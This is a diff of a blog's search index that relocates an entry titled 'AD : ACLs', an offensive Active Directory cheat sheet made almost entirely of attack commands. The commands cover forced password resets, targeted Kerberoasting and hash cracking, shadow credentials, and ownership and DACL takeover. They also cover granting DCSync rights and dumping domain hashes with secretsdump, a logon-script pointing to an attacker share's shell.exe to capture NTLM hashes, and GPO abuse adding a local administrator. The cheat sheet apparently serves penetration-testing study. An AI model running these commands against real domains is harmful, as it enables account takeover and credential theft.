@@ -1,6 +1,182 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>AD : ACLs</title>
+    <url>/2025/12/02/AD-ACLs/</url>
+    <content><![CDATA[<h1 id="ForceChangePassword"><a href="#ForceChangePassword" class="headerlink" title="ForceChangePassword"></a>ForceChangePassword</h1><blockquote>
+<p>➜ Reset the target user’s password without knowing the old password</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb domain -u our-user -p password -M change-password -o USER=<span class="string">&#x27;target-username&#x27;</span> NEWPASS=<span class="string">&#x27;new-password&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host ip -d dc -u our-user -p password <span class="built_in">set</span> password target-username new-password</span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net rpc password target-username new-password -U <span class="string">&quot;domain&quot;</span>/<span class="string">&quot;our-user&quot;</span>%<span class="string">&quot;password&quot;</span> -S DC</span><br></pre></td></tr></table></figure>
+
+<h1 id="WriteSPN"><a href="#WriteSPN" class="headerlink" title="WriteSPN"></a>WriteSPN</h1><blockquote>
+<p>➜ Targeted Kerberoasting.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host dc -d domain -u username -p password <span class="built_in">set</span> object target_user servicePrincipalName -v <span class="string">&#x27;domain/meow&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc ldap fqdn -u username -p <span class="built_in">pwd</span> -k --kerberoasting file-name</span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">targetedKerberoast.py -d domain --dc-ip ip -u username -p password --dc-host dc --request-user target_user</span><br></pre></td></tr></table></figure>
+
+<p>Then we can crack the hash with :</p>
+<blockquote>
+<p>for $krb5tgs$23$*…</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 13100 -a 0 hashfile wordilst.txt </span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>for $krb5tgs$18$*…</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 19700 -a 0 hashfile wordlist.txt</span><br></pre></td></tr></table></figure>
+
+<h1 id="AddMember"><a href="#AddMember" class="headerlink" title="AddMember"></a>AddMember</h1><blockquote>
+<p>➜ Add any user to the target group.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD.py --host dc -d domain -u our-user -p password add groupMember target-group target-user</span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net rpc group addmem target-group target-user -U domain/our-user -S dc</span><br></pre></td></tr></table></figure>
+
+<h1 id="AddSelf"><a href="#AddSelf" class="headerlink" title="AddSelf"></a>AddSelf</h1><blockquote>
+<p>➜ Add yourself to the target group.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD.py --host dc -d domain -u our-user -p password add groupMember target-group target-user</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="ReadLAPSPassword"><a href="#ReadLAPSPassword" class="headerlink" title="ReadLAPSPassword"></a>ReadLAPSPassword</h1><blockquote>
+<p>➜ Read the LAPS local admin password from a computer object.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb target -u username -p password --laps</span><br></pre></td></tr></table></figure>
+
+<h1 id="ReadGMSAPassword"><a href="#ReadGMSAPassword" class="headerlink" title="ReadGMSAPassword"></a>ReadGMSAPassword</h1><blockquote>
+<p>➜ Read the password of a gMSA service account.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc ldap target -u username -p password --gmsa</span><br></pre></td></tr></table></figure>
+
+<h1 id="Shadow-Credentials-AddKeyCredentialLink"><a href="#Shadow-Credentials-AddKeyCredentialLink" class="headerlink" title="Shadow Credentials (AddKeyCredentialLink)"></a>Shadow Credentials (AddKeyCredentialLink)</h1><blockquote>
+<p>➜ Add your own KeyCredentialLink → authenticate as the target using a forged certificate.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy shadow auto -u username@domain -p password -account target-user -dc-ip ip</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="WriteOwner"><a href="#WriteOwner" class="headerlink" title="WriteOwner"></a>WriteOwner</h1><blockquote>
+<p>➜ Take ownership of the object</p>
+</blockquote>
+<h3 id="User"><a href="#User" class="headerlink" title="User"></a>User</h3><p>Take Ownership Of The Target User :</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">owneredit.py -action write -new-owner our-user -target target-user domain/our-user:password -dc-ip dc-ip</span><br></pre></td></tr></table></figure>
+
+<p>Grant Ourselves Full Control (GenericAll) Over the Target User</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dacledit.py -action <span class="string">&#x27;write&#x27;</span> -rights <span class="string">&#x27;FullControl&#x27;</span> -principal our-user -target target-user <span class="string">&#x27;domain/our-user:password&#x27;</span> -dc-ip dc-ip</span><br></pre></td></tr></table></figure>
+<h3 id="Group"><a href="#Group" class="headerlink" title="Group"></a>Group</h3><p>Take Ownership Of The Target Group :</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">owneredit.py -action write -new-owner our-user -target target-group domain/our-user:password -dc-ip dc-ip</span><br></pre></td></tr></table></figure>
+
+<p>Grant Ourselves Full Control (GenericAll) Over the Target User :</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dacledit.py -action <span class="string">&#x27;write&#x27;</span> -rights <span class="string">&#x27;FullControl&#x27;</span> -principal our-user -target target-group <span class="string">&#x27;domain/our-user:password&#x27;</span> -dc-ip dc-ip</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h1 id="GenericWrite"><a href="#GenericWrite" class="headerlink" title="GenericWrite"></a>GenericWrite</h1><blockquote>
+<p>➜ Modify attributes of the target object (depends on object type).</p>
+</blockquote>
+<h2 id="User-1"><a href="#User-1" class="headerlink" title="User"></a>User</h2><h3 id="Targeted-Kerberoasting"><a href="#Targeted-Kerberoasting" class="headerlink" title="Targeted Kerberoasting"></a>Targeted Kerberoasting</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host dc -d domain -u username -p password <span class="built_in">set</span> object target_user servicePrincipalName -v <span class="string">&#x27;domain/meow&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">targetedKerberoast.py -d domain --dc-ip ip -u username -p password --dc-host dc --request-user target_user</span><br></pre></td></tr></table></figure>
+
+<h3 id="ForceChangePassword-1"><a href="#ForceChangePassword-1" class="headerlink" title="ForceChangePassword"></a>ForceChangePassword</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb domain -u our-user -p password -M change-password -o USER=<span class="string">&#x27;target-username&#x27;</span> NEWPASS=<span class="string">&#x27;new-password&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host ip -d dc -u our-user -p password <span class="built_in">set</span> password target-username new-password</span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net rpc password target-username new-password -U <span class="string">&quot;domain&quot;</span>/<span class="string">&quot;our-user&quot;</span>%<span class="string">&quot;password&quot;</span> -S DC</span><br></pre></td></tr></table></figure>
+
+<h3 id="Shadow-Credentials-AddKeyCredentialLink-1"><a href="#Shadow-Credentials-AddKeyCredentialLink-1" class="headerlink" title="Shadow Credentials (AddKeyCredentialLink)"></a>Shadow Credentials (AddKeyCredentialLink)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy shadow auto -u username@domain -p password -account target-user -dc-ip ip</span><br></pre></td></tr></table></figure>
+
+<h3 id="Logon-Script"><a href="#Logon-Script" class="headerlink" title="Logon Script"></a>Logon Script</h3><h5 id="bloodyAD"><a href="#bloodyAD" class="headerlink" title="bloodyAD"></a>bloodyAD</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="string">&quot;DC-IP&quot;</span> -d <span class="string">&quot;domain&quot;</span> -u <span class="string">&quot;our-user&quot;</span> -p <span class="string">&quot;password&quot;</span> <span class="built_in">set</span> object target-user scriptPath -v <span class="string">&#x27;\\our-ip\share\shell.exe&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;\\our-ip\share\file.exe&quot;</span> &gt; shares.ps1 </span><br><span class="line"></span><br><span class="line">Set-DomainObject -Identity maria -SET @&#123;scriptpath=<span class="string">&quot;C:\\shares.ps1&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code> ➜ Then we can capture the ntlm hash</code></p>
+<h2 id="Group-1"><a href="#Group-1" class="headerlink" title="Group"></a>Group</h2><h5 id="AddMember-1"><a href="#AddMember-1" class="headerlink" title="AddMember"></a>AddMember</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD.py --host dc -d domain -u our-user -p password add groupMember target-group target-user</span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net rpc group addmem target-group target-user -U domain/our-user -S dc</span><br></pre></td></tr></table></figure>
+
+<h2 id="Computer"><a href="#Computer" class="headerlink" title="Computer"></a>Computer</h2><h5 id="Change-Password"><a href="#Change-Password" class="headerlink" title="Change Password"></a>Change Password</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">addcomputer.py -computer-name <span class="string">&#x27;target-computer&#x27;</span> -computer-pass <span class="string">&#x27;new-password&#x27;</span> -no-add -dc-host DC <span class="string">&#x27;domain/our-user:password&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="WriteDACL"><a href="#WriteDACL" class="headerlink" title="WriteDACL"></a>WriteDACL</h1><blockquote>
+<p>➜ Modify the ACL → give yourself any rights.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dacledit.py -action <span class="string">&#x27;write&#x27;</span> -rights <span class="string">&#x27;DCSync&#x27;</span> -principal <span class="string">&#x27;controlledUser&#x27;</span> -target-dn <span class="string">&#x27;DomainDisinguishedName&#x27;</span> <span class="string">&#x27;domain&#x27;</span>/<span class="string">&#x27;controlledUser&#x27;</span>:<span class="string">&#x27;password&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>DCsync </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump <span class="string">&#x27;DOMAIN&#x27;</span>/<span class="string">&#x27;USER&#x27;</span>:<span class="string">&#x27;PASSWORD&#x27;</span>@<span class="string">&#x27;DOMAINCONTROLLER&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="DCSync-Rights"><a href="#DCSync-Rights" class="headerlink" title="DCSync Rights"></a>DCSync Rights</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">secretsdump.py domain/username:password@domain</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">secretsdump.py domain/username@domain -hashes :<span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">secretsdump.py dc -k</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb target -u username -p password --ntds</span><br></pre></td></tr></table></figure>
+
+<h1 id="GenericAll"><a href="#GenericAll" class="headerlink" title="GenericAll"></a>GenericAll</h1><blockquote>
+<p>➜ Full control over the target object.</p>
+</blockquote>
+<h3 id="User-2"><a href="#User-2" class="headerlink" title="User"></a>User</h3><blockquote>
+<p>➜ Change User’s Password</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb domain -u our-user -p password -M change-password -o USER=<span class="string">&#x27;target-username&#x27;</span> NEWPASS=<span class="string">&#x27;new-password&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host ip -d dc -u our-user -p password <span class="built_in">set</span> password target-username new-password</span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net rpc password target-username new-password -U <span class="string">&quot;domain&quot;</span>/<span class="string">&quot;our-user&quot;</span>%<span class="string">&quot;password&quot;</span> -S DC</span><br></pre></td></tr></table></figure>
+
+<h3 id="Group-2"><a href="#Group-2" class="headerlink" title="Group"></a>Group</h3><blockquote>
+<p>➜ Add Users to the target group</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host dc -d domain -u username -p password add groupMember target-group target-username</span><br></pre></td></tr></table></figure>
+
+<h3 id="Group-Policy-Object-GPO"><a href="#Group-Policy-Object-GPO" class="headerlink" title="Group Policy Object ( GPO )"></a>Group Policy Object ( GPO )</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/Hackndo/pyGPOAbuse.git</span><br><span class="line"></span><br><span class="line">uv add --script pygpoabuse.py -r requirements.txt</span><br><span class="line"></span><br><span class="line">uv run --script pygpoabuse.py domain/our-user:password -gpo-id &lt;id&gt; -command &#x27;net localgroup administrators our-user /add&#x27; -f</span><br></pre></td></tr></table></figure>
+
+<p><code>➜ We can get the gpo id via output of Bloodhound</code></p>
+<h3 id="Organization-Unit"><a href="#Organization-Unit" class="headerlink" title="Organization Unit"></a>Organization Unit</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dacledit.py -action <span class="string">&#x27;write&#x27;</span> -rights <span class="string">&#x27;FullControl&#x27;</span> -inheritance -principal our-user -target-dn <span class="string">&#x27;Organization-Unit&#x27;</span> domain/our-user:password</span><br></pre></td></tr></table></figure>
+
+<p>With Kerberos </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dacledit.py -action write -rights <span class="string">&#x27;FullControl&#x27;</span> -inheritance -principal our-user -target-dn <span class="string">&#x27;Organization-Unit&#x27;</span> domain/our-user:password -dc-ip dc -k</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Exploitation</category>
+        <category>ACLs</category>
+      </categories>
+      <tags>
+        <tag>netexec</tag>
+        <tag>Certipy</tag>
+        <tag>dacledit</tag>
+        <tag>owneredit</tag>
+        <tag>bloodyAD</tag>
+        <tag>secretsdump</tag>
+        <tag>PowerView</tag>
+        <tag>net</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ADCS : ESC10</title>
     <url>/2026/06/04/ADCS-ESC10/</url>
     <content><![CDATA[<h1 id="Certificate-authentication-mapping"><a href="#Certificate-authentication-mapping" class="headerlink" title="Certificate authentication mapping"></a>Certificate authentication mapping</h1><p>When we authenticate using the <code>Certificate Authentication</code> method the Domain Controller (KDC) must answer a critical question :</p>
@@ -212,185 +388,9 @@
         <category>ADCS</category>
       </categories>
       <tags>
+        <tag>Certipy</tag>
         <tag>ESC10</tag>
-        <tag>Certipy</tag>
         <tag>Netexec</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>AD : ACLs</title>
-    <url>/2025/12/02/AD-ACLs/</url>
-    <content><![CDATA[<h1 id="ForceChangePassword"><a href="#ForceChangePassword" class="headerlink" title="ForceChangePassword"></a>ForceChangePassword</h1><blockquote>
-<p>➜ Reset the target user’s password without knowing the old password</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb domain -u our-user -p password -M change-password -o USER=<span class="string">&#x27;target-username&#x27;</span> NEWPASS=<span class="string">&#x27;new-password&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>Or</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host ip -d dc -u our-user -p password <span class="built_in">set</span> password target-username new-password</span><br></pre></td></tr></table></figure>
-
-<p>Or</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net rpc password target-username new-password -U <span class="string">&quot;domain&quot;</span>/<span class="string">&quot;our-user&quot;</span>%<span class="string">&quot;password&quot;</span> -S DC</span><br></pre></td></tr></table></figure>
-
-<h1 id="WriteSPN"><a href="#WriteSPN" class="headerlink" title="WriteSPN"></a>WriteSPN</h1><blockquote>
-<p>➜ Targeted Kerberoasting.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host dc -d domain -u username -p password <span class="built_in">set</span> object target_user servicePrincipalName -v <span class="string">&#x27;domain/meow&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc ldap fqdn -u username -p <span class="built_in">pwd</span> -k --kerberoasting file-name</span><br></pre></td></tr></table></figure>
-
-<p>Or</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">targetedKerberoast.py -d domain --dc-ip ip -u username -p password --dc-host dc --request-user target_user</span><br></pre></td></tr></table></figure>
-
-<p>Then we can crack the hash with :</p>
-<blockquote>
-<p>for $krb5tgs$23$*…</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 13100 -a 0 hashfile wordilst.txt </span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>for $krb5tgs$18$*…</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 19700 -a 0 hashfile wordlist.txt</span><br></pre></td></tr></table></figure>
-
-<h1 id="AddMember"><a href="#AddMember" class="headerlink" title="AddMember"></a>AddMember</h1><blockquote>
-<p>➜ Add any user to the target group.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD.py --host dc -d domain -u our-user -p password add groupMember target-group target-user</span><br></pre></td></tr></table></figure>
-
-<p>Or</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net rpc group addmem target-group target-user -U domain/our-user -S dc</span><br></pre></td></tr></table></figure>
-
-<h1 id="AddSelf"><a href="#AddSelf" class="headerlink" title="AddSelf"></a>AddSelf</h1><blockquote>
-<p>➜ Add yourself to the target group.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD.py --host dc -d domain -u our-user -p password add groupMember target-group target-user</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="ReadLAPSPassword"><a href="#ReadLAPSPassword" class="headerlink" title="ReadLAPSPassword"></a>ReadLAPSPassword</h1><blockquote>
-<p>➜ Read the LAPS local admin password from a computer object.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb target -u username -p password --laps</span><br></pre></td></tr></table></figure>
-
-<h1 id="ReadGMSAPassword"><a href="#ReadGMSAPassword" class="headerlink" title="ReadGMSAPassword"></a>ReadGMSAPassword</h1><blockquote>
-<p>➜ Read the password of a gMSA service account.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc ldap target -u username -p password --gmsa</span><br></pre></td></tr></table></figure>
-
-<h1 id="Shadow-Credentials-AddKeyCredentialLink"><a href="#Shadow-Credentials-AddKeyCredentialLink" class="headerlink" title="Shadow Credentials (AddKeyCredentialLink)"></a>Shadow Credentials (AddKeyCredentialLink)</h1><blockquote>
-<p>➜ Add your own KeyCredentialLink → authenticate as the target using a forged certificate.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy shadow auto -u username@domain -p password -account target-user -dc-ip ip</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="WriteOwner"><a href="#WriteOwner" class="headerlink" title="WriteOwner"></a>WriteOwner</h1><blockquote>
-<p>➜ Take ownership of the object</p>
-</blockquote>
-<h3 id="User"><a href="#User" class="headerlink" title="User"></a>User</h3><p>Take Ownership Of The Target User :</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">owneredit.py -action write -new-owner our-user -target target-user domain/our-user:password -dc-ip dc-ip</span><br></pre></td></tr></table></figure>
-
-<p>Grant Ourselves Full Control (GenericAll) Over the Target User</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dacledit.py -action <span class="string">&#x27;write&#x27;</span> -rights <span class="string">&#x27;FullControl&#x27;</span> -principal our-user -target target-user <span class="string">&#x27;domain/our-user:password&#x27;</span> -dc-ip dc-ip</span><br></pre></td></tr></table></figure>
-<h3 id="Group"><a href="#Group" class="headerlink" title="Group"></a>Group</h3><p>Take Ownership Of The Target Group :</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">owneredit.py -action write -new-owner our-user -target target-group domain/our-user:password -dc-ip dc-ip</span><br></pre></td></tr></table></figure>
-
-<p>Grant Ourselves Full Control (GenericAll) Over the Target User :</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dacledit.py -action <span class="string">&#x27;write&#x27;</span> -rights <span class="string">&#x27;FullControl&#x27;</span> -principal our-user -target target-group <span class="string">&#x27;domain/our-user:password&#x27;</span> -dc-ip dc-ip</span><br></pre></td></tr></table></figure>
-
-
-
-
-<h1 id="GenericWrite"><a href="#GenericWrite" class="headerlink" title="GenericWrite"></a>GenericWrite</h1><blockquote>
-<p>➜ Modify attributes of the target object (depends on object type).</p>
-</blockquote>
-<h2 id="User-1"><a href="#User-1" class="headerlink" title="User"></a>User</h2><h3 id="Targeted-Kerberoasting"><a href="#Targeted-Kerberoasting" class="headerlink" title="Targeted Kerberoasting"></a>Targeted Kerberoasting</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host dc -d domain -u username -p password <span class="built_in">set</span> object target_user servicePrincipalName -v <span class="string">&#x27;domain/meow&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>Or</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">targetedKerberoast.py -d domain --dc-ip ip -u username -p password --dc-host dc --request-user target_user</span><br></pre></td></tr></table></figure>
-
-<h3 id="ForceChangePassword-1"><a href="#ForceChangePassword-1" class="headerlink" title="ForceChangePassword"></a>ForceChangePassword</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb domain -u our-user -p password -M change-password -o USER=<span class="string">&#x27;target-username&#x27;</span> NEWPASS=<span class="string">&#x27;new-password&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>Or</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host ip -d dc -u our-user -p password <span class="built_in">set</span> password target-username new-password</span><br></pre></td></tr></table></figure>
-
-<p>Or</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net rpc password target-username new-password -U <span class="string">&quot;domain&quot;</span>/<span class="string">&quot;our-user&quot;</span>%<span class="string">&quot;password&quot;</span> -S DC</span><br></pre></td></tr></table></figure>
-
-<h3 id="Shadow-Credentials-AddKeyCredentialLink-1"><a href="#Shadow-Credentials-AddKeyCredentialLink-1" class="headerlink" title="Shadow Credentials (AddKeyCredentialLink)"></a>Shadow Credentials (AddKeyCredentialLink)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy shadow auto -u username@domain -p password -account target-user -dc-ip ip</span><br></pre></td></tr></table></figure>
-
-<h3 id="Logon-Script"><a href="#Logon-Script" class="headerlink" title="Logon Script"></a>Logon Script</h3><h5 id="bloodyAD"><a href="#bloodyAD" class="headerlink" title="bloodyAD"></a>bloodyAD</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="string">&quot;DC-IP&quot;</span> -d <span class="string">&quot;domain&quot;</span> -u <span class="string">&quot;our-user&quot;</span> -p <span class="string">&quot;password&quot;</span> <span class="built_in">set</span> object target-user scriptPath -v <span class="string">&#x27;\\our-ip\share\shell.exe&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<h5 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;\\our-ip\share\file.exe&quot;</span> &gt; shares.ps1 </span><br><span class="line"></span><br><span class="line">Set-DomainObject -Identity maria -SET @&#123;scriptpath=<span class="string">&quot;C:\\shares.ps1&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
-
-<p><code> ➜ Then we can capture the ntlm hash</code></p>
-<h2 id="Group-1"><a href="#Group-1" class="headerlink" title="Group"></a>Group</h2><h5 id="AddMember-1"><a href="#AddMember-1" class="headerlink" title="AddMember"></a>AddMember</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD.py --host dc -d domain -u our-user -p password add groupMember target-group target-user</span><br></pre></td></tr></table></figure>
-
-<p>Or</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net rpc group addmem target-group target-user -U domain/our-user -S dc</span><br></pre></td></tr></table></figure>
-
-<h2 id="Computer"><a href="#Computer" class="headerlink" title="Computer"></a>Computer</h2><h5 id="Change-Password"><a href="#Change-Password" class="headerlink" title="Change Password"></a>Change Password</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">addcomputer.py -computer-name <span class="string">&#x27;target-computer&#x27;</span> -computer-pass <span class="string">&#x27;new-password&#x27;</span> -no-add -dc-host DC <span class="string">&#x27;domain/our-user:password&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="WriteDACL"><a href="#WriteDACL" class="headerlink" title="WriteDACL"></a>WriteDACL</h1><blockquote>
-<p>➜ Modify the ACL → give yourself any rights.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dacledit.py -action <span class="string">&#x27;write&#x27;</span> -rights <span class="string">&#x27;DCSync&#x27;</span> -principal <span class="string">&#x27;controlledUser&#x27;</span> -target-dn <span class="string">&#x27;DomainDisinguishedName&#x27;</span> <span class="string">&#x27;domain&#x27;</span>/<span class="string">&#x27;controlledUser&#x27;</span>:<span class="string">&#x27;password&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>DCsync </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump <span class="string">&#x27;DOMAIN&#x27;</span>/<span class="string">&#x27;USER&#x27;</span>:<span class="string">&#x27;PASSWORD&#x27;</span>@<span class="string">&#x27;DOMAINCONTROLLER&#x27;</span></span><br></pre></td></tr></table></figure>
-
-
-<h1 id="DCSync-Rights"><a href="#DCSync-Rights" class="headerlink" title="DCSync Rights"></a>DCSync Rights</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">secretsdump.py domain/username:password@domain</span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">secretsdump.py domain/username@domain -hashes :<span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">secretsdump.py dc -k</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb target -u username -p password --ntds</span><br></pre></td></tr></table></figure>
-
-<h1 id="GenericAll"><a href="#GenericAll" class="headerlink" title="GenericAll"></a>GenericAll</h1><blockquote>
-<p>➜ Full control over the target object.</p>
-</blockquote>
-<h3 id="User-2"><a href="#User-2" class="headerlink" title="User"></a>User</h3><blockquote>
-<p>➜ Change User’s Password</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb domain -u our-user -p password -M change-password -o USER=<span class="string">&#x27;target-username&#x27;</span> NEWPASS=<span class="string">&#x27;new-password&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>Or</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host ip -d dc -u our-user -p password <span class="built_in">set</span> password target-username new-password</span><br></pre></td></tr></table></figure>
-
-<p>Or</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net rpc password target-username new-password -U <span class="string">&quot;domain&quot;</span>/<span class="string">&quot;our-user&quot;</span>%<span class="string">&quot;password&quot;</span> -S DC</span><br></pre></td></tr></table></figure>
-
-<h3 id="Group-2"><a href="#Group-2" class="headerlink" title="Group"></a>Group</h3><blockquote>
-<p>➜ Add Users to the target group</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host dc -d domain -u username -p password add groupMember target-group target-username</span><br></pre></td></tr></table></figure>
-
